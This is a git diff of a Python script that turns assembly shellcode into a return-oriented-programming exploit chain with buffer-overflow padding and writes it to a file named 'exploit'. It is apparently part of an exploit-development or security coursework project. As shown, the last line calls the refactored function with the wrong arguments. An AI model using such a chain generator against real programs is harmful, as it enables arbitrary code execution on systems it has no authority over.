@@ -4,9 +4,6 @@ import re
 import argparse
 from pathlib import Path
 from struct import pack
-from struct import unpack
-import sys
-import os
 
 import Extracted_Functions
 
@@ -19,24 +16,26 @@ parser = argparse.ArgumentParser(
 parser.add_argument("--shellcode", default= None)
 parser.add_argument("--out-rop-path", default = None)
 
-def main(args):
 
-    gadgets, data_address = parse_out_rop(Path(args.out_rop_path))
+def generate_shellcode_chain(padding, out_rop_path, shellcode):
+    gadgets, data_address = parse_out_rop(Path(out_rop_path))
     gadgets = removeNone(gadgets)
-    rop_chain = b'A'*44
+    rop_chain = b'A'*padding
     data_values = []
     null = None
-    label_address_map,data_values = reads(args.shellcode, data_address,data_values)
+    label_address_map,data_values = reads(shellcode, data_address,data_values)
     bytes_pushed,rop_addition,null  = chunking(data_values,data_address, null,label_address_map)
     rop_chain += rop_addition
-    rop_chain, register_info = readinstructions(args.shellcode,data_address,data_values,label_address_map,rop_chain,gadgets, null)
-    sys.stdout.buffer.write(rop_chain)
-    file_path = "chain"
+    rop_chain, register_info = readinstructions(shellcode,data_address,data_values,label_address_map,rop_chain,gadgets, null)
+    file_path = "exploit"
     try:
         with open(file_path, 'wb') as file:  # 'xb' mode for creating and writing in binary
             file.write(rop_chain)
     except FileExistsError:
         print(f"The file '{file_path}' already exists.")
+
+    return file_path
+
 
 def reads(file_name,data_address,data_values):
     rodata_start = False
@@ -122,6 +121,7 @@ def chunking(array, data_address, null,label_address_map):
     stack_pointer = data_address
     pointers = []
     rop_chain = b''
+    first_time = True
 
     for string in array:
             
@@ -130,8 +130,11 @@ def chunking(array, data_address, null,label_address_map):
                     stack_pointer += 4
 
             elif (string == '0'):
-                    rop_add , null = Extracted_Functions.push_null(stack_pointer,null)
-                    rop_chain += rop_add
+
+                    if first_time:
+                        null = stack_pointer
+                        first_time = False
+                    rop_chain += Extracted_Functions.push_null(stack_pointer)
                     stack_pointer += 4
             else:
                      
@@ -149,8 +152,6 @@ def chunking(array, data_address, null,label_address_map):
  
     bytes_pushed = stack_pointer - data_address
     return  bytes_pushed, rop_chain, null
-    
-
 
 
 def readinstructions(file_name, data_address, data_values, contents,rop_chain,gadgets,null):
@@ -186,7 +187,8 @@ def readinstructions(file_name, data_address, data_values, contents,rop_chain,ga
         print(f"An error occurred: {e}")
 
     return rop_chain, register_info
-    
+
+
 def mov(ar1,ar2, data_values,contents,rop_chain,gadgets,register_info,null):
     if ar1 in ['ebx', 'ecx', 'edx', 'eax']:
         if ar2 in contents:
@@ -384,4 +386,4 @@ def parse_assembly_line(data_line,current_address):
     return processed_items, current_address
 
 if __name__ == "__main__":
-    main(parser.parse_args())
+    generate_shellcode_chain(parser.parse_args())
